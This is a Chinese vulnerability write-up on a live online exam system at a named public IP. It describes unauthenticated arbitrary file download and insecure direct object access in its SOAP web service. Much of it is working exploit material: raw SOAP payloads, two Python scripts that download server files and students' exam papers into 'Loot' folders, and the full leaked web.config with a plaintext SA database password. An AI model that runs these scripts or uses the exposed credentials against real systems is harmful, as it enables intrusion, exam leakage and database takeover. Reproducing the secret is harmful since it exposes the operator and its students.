# 漏洞概览



在对目标考试系统（Eiven.Exam2021）进行安全测试时，发现其核心 WebService 接口存在严重的逻辑漏洞与配置缺陷。攻击者无需任何身份认证，即可利用\*\*任意文件下载漏洞\*\*获取服务器核心配置文件（`web.config`），导致数据库最高权限（SA）账号密码泄露；同时存在**水平越权漏洞**，可批量下载所有考生的试卷及答卷。



漏洞主要涉及接口：`/Models/Exam2020.asmx` 中的 `GetFileData` 与 `GetExamFiles` 方法。



---



# 漏洞详情与复现



## 1. 任意文件下载漏洞



### 漏洞原理

接口 `GetFileData` 未对用户输入的 `path` 参数进行安全性校验，允许接收服务器绝对物理路径，读取服务器磁盘上的任意文件。



### 复现步骤

**第一步：获取服务器物理路径**

向接口发送非法请求触发 500 错误，由于服务器开启了调试模式（`customErrors=Off`），报错信息中泄露了 Web 应用程序的真实物理路径：

`e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\`



**第二步：构造 Payload 下载核心配置**

利用获取的路径，构造读取 `web.config` 的 SOAP 请求。

* 目标文件：`e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\web.config`



```http
POST /Models/Exam2020.asmx HTTP/1.1
Host: 120.55.241.236:999
Content-Type: text/xml; charset=utf-8
SOAPAction: "[http://tempuri.org/GetFileData](http://tempuri.org/GetFileData)"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="[http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance)" xmlns:xsd="[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema)" xmlns:soap="[http://schemas.xmlsoap.org/soap/envelope/](http://schemas.xmlsoap.org/soap/envelope/)">
  <soap:Body>
    <GetFileData xmlns="[http://tempuri.org/](http://tempuri.org/)">
      <path>e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\web.config</path>
    </GetFileData>
  </soap:Body>
</soap:Envelope>
```



复现结果：



服务器返回了 Base64 编码的文件内容。解码后得到完整的 web.config 文件，其中明文存储了数据库 SA 权限 的连接字符串：



**XML**



```http
<connectionStrings>
    <clear/>
    <add name="EXE" connectionString="Data Source=.\MSSQL;Initial Catalog=EXE;User ID=sa;Password=obafgkm37" providerName="System.Data.SqlClient"/>
</connectionStrings>

```



---



## 2. 未授权访问/水平越权漏洞 



### 漏洞原理



接口 `GetExamFiles(int uid)` 缺乏身份鉴权机制。服务端仅根据客户端提交的 `uid` 参数返回对应的考卷列表，攻击者通过遍历 `uid`（如 1000-10000），即可获取任意考生的考试文件信息。



### 复现步骤



直接向接口发送 SOAP 请求，指定目标用户 ID（例如 `9205`）：



**XML**



```
<soap:Body>
  <GetExamFiles xmlns="[http://tempuri.org/](http://tempuri.org/)">
    <uid>9205</uid>
  </GetExamFiles>
</soap:Body>

```



复现结果：



服务器返回该考生名下的考卷文件列表（如 程序设计与计算思维考试A卷编程部分.pdf）。随后可利用 GetExamFile 接口下载该文件，导致考题完全泄露。



---



# 危害分析



攻击者可批量下载所有试卷，严重破坏考试的公平性与机密性。甚至可以为他人提交试卷和查看他人的提交答案。或者是下载服务器文件


# 附件

1.getExamFile.py

```python
import requests
import base64
import os
import xml.etree.ElementTree as ET

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
TARGET_UID = 9205 
SAVE_DIR = f"./Loot_Final_{TARGET_UID}"
# ===========================================

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def get_exam_files_list(uid):
    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetExamFiles xmlns="http://tempuri.org/">
          <uid>{uid}</uid>
        </GetExamFiles>
      </soap:Body>
    </soap:Envelope>"""

    try:
        headers = HEADERS.copy()
        headers["SOAPAction"] = "http://tempuri.org/GetExamFiles"
        
        print(f"[*] (1/2) 正在查询 ID {uid} 的列表...")
        response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=headers, timeout=10)
        
        if response.status_code != 200:
            print(f"[!] 列表查询失败: {response.status_code}")
            return []

        root = ET.fromstring(response.text)
        ns = {'soap': 'http://schemas.xmlsoap.org/soap/envelope/', 'def': 'http://tempuri.org/'}
        
        files = []
        for string_elem in root.findall(".//def:string", ns):
            if string_elem.text:
                files.append(string_elem.text)
        return files

    except Exception as e:
        print(f"[!] 查询异常: {e}")
        return []

def download_file(uid, filename):
    encoded_filename = to_html_entities(filename)
    
    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetExamFile xmlns="http://tempuri.org/">
          <uid>{uid}</uid>
          <filename>{encoded_filename}</filename>
        </GetExamFile>
      </soap:Body>
    </soap:Envelope>"""

    try:
        headers = HEADERS.copy()
        headers["SOAPAction"] = "http://tempuri.org/GetExamFile"
        
        print(f"[*] (2/2) 正在下载: {filename}")
        
        response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=headers, timeout=30)

        if response.status_code != 200:
            print(f"    [!] 下载失败 (Status: {response.status_code})")
            print(f"    [Server Error] {response.text[:200]}") # 打印部分错误信息
            return

        root = ET.fromstring(response.text)
        ns = {'soap': 'http://schemas.xmlsoap.org/soap/envelope/', 'def': 'http://tempuri.org/'}
        
        result_elem = root.find(".//def:GetExamFileResult", ns)
        
        if result_elem is not None and result_elem.text:
            file_data = base64.b64decode(result_elem.text)
            
            save_path = os.path.join(SAVE_DIR, filename)
            with open(save_path, "wb") as f:
                f.write(file_data)
            print(f"    [+] 成功! 已保存: {save_path} ({len(file_data)} bytes)")
        else:
            print(f"    [-] 文件内容为空")

    except Exception as e:
        print(f"    [!] 下载异常: {e}")

if __name__ == "__main__":
    if not os.path.exists(SAVE_DIR):
        os.makedirs(SAVE_DIR)
    
    files = get_exam_files_list(TARGET_UID)
    
    if files:
        print(f"[+] 发现 {len(files)} 个文件。")
        for f in files:
            download_file(TARGET_UID, f)
            
        print("\n[★] 任务完成。请查看文件夹。")
        try: os.startfile(SAVE_DIR)
        except: pass
    else:
        print("[-] 未找到文件。")
```


2.web.config.xml
```
<?xml version="1.0"?>
<!--
  有关如何配置 ASP.NET 应用程序的详细信息，请访问
  http://go.microsoft.com/fwlink/?LinkId=169433
  -->
<configuration>
  <!--
    有关 web.config 更改的说明，请参见 http://go.microsoft.com/fwlink/?LinkId=235367。

    可在 <httpRuntime> 标记上设置以下特性。
      <system.Web>
        <httpRuntime targetFramework="4.6" />
      </system.Web>
  -->
  <appSettings>
    <add key="BaseExamPath" value="F:\Exam2020\"/>
  </appSettings>
  <connectionStrings>
    <clear/>
    <add name="EXE" connectionString="Data Source=.\MSSQL;Initial Catalog=EXE;User ID=sa;Password=obafgkm37" providerName="System.Data.SqlClient"/>
  </connectionStrings>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <add name="Cache-Control" value="no-cache"/>
      </customHeaders>
    </httpProtocol>
    <defaultDocument>
      <files>
        <remove value="Default.htm"/>
        <remove value="Default.asp"/>
        <remove value="index.htm"/>
        <remove value="index.html"/>
        <remove value="iisstart.htm"/>
        <remove value="default.aspx"/>
        <add value="Default.aspx"/>
      </files>
    </defaultDocument>
  </system.webServer>
  <system.serviceModel>
    <bindings>
      <basicHttpBinding>
        <binding name="DeviceServiceSoap" maxBufferSize="2147483647" maxReceivedMessageSize="2147483647"/>
      </basicHttpBinding>
      <customBinding>
        <binding name="DeviceServiceSoap12">
          <textMessageEncoding messageVersion="Soap12"/>
          <httpTransport/>
        </binding>
      </customBinding>
    </bindings>
    <client>
      <endpoint address="http://exelab.org/Models/Exam2020.asmx" contract="*" binding="basicHttpBinding" bindingConfiguration="DeviceServiceSoap"/>
    </client>
  </system.serviceModel>
  <system.web>
    <customErrors mode="Off"/>
    <compilation debug="true" targetFramework="4.6"/>
    <httpRuntime maxRequestLength="2147483647" executionTimeout="36000"/>
    <pages controlRenderingCompatibilityVersion="4.0"/>
  </system.web>
  <system.web.extensions>
    <scripting>
      <webServices>
        <jsonSerialization maxJsonLength="2147483647"/>
      </webServices>
    </scripting>
  </system.web.extensions>
  <system.codedom/>
</configuration>
```

3.poc.py

```python
import requests
import base64
import os
import xml.etree.ElementTree as ET

# ================= 配置 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
SAVE_DIR = "./Loot_Final_Config"
# =======================================

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction": "http://tempuri.org/GetFileData", 
    "User-Agent": "Eiven.Exam2021 Client"
}

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def probe_file(desc, remote_path):
    encoded_path = to_html_entities(remote_path)
    
    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetFileData xmlns="http://tempuri.org/">
          <path>{encoded_path}</path>
        </GetFileData>
      </soap:Body>
    </soap:Envelope>"""

    try:
        print(f"[*] 测试目标: {desc}")
        print(f"    Payload: {remote_path}")
        
        response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=HEADERS, timeout=15)

        if response.status_code == 200:
            root = ET.fromstring(response.text)
            ns = {'soap': 'http://schemas.xmlsoap.org/soap/envelope/', 'def': 'http://tempuri.org/'}
            result_elem = root.find(".//def:GetFileDataResult", ns)
            
            if result_elem is not None and result_elem.text:
                file_data = base64.b64decode(result_elem.text)
                save_path = os.path.join(SAVE_DIR, "web.config.xml")
                with open(save_path, "wb") as f:
                    f.write(file_data)
                print(f"    [★ JACKPOT] 下载成功！大小: {len(file_data)} bytes")
                print(f"    [+] 保存路径: {save_path}")
                print("    >>> 任意文件下载漏洞实锤！ <<<")
                return True
        elif response.status_code == 500:
             print("    [!] 500 Error - 文件未找到或拒绝访问 (请检查报错详情)")
             # print(response.text) # 需要时取消注释
    except Exception as e:
        print(f"    [!] 异常: {e}")
    return False

if __name__ == "__main__":
    if not os.path.exists(SAVE_DIR):
        os.makedirs(SAVE_DIR)

    print("=== 基于堆栈信息泄露的最终打击 ===")
    
    # 根据堆栈信息 e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Models\App_Code\Exam2020.asmx.cs
    # 推导出的网站根目录：
    real_target = r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\web.config"
    
    probe_file("真实Web配置", real_target)
```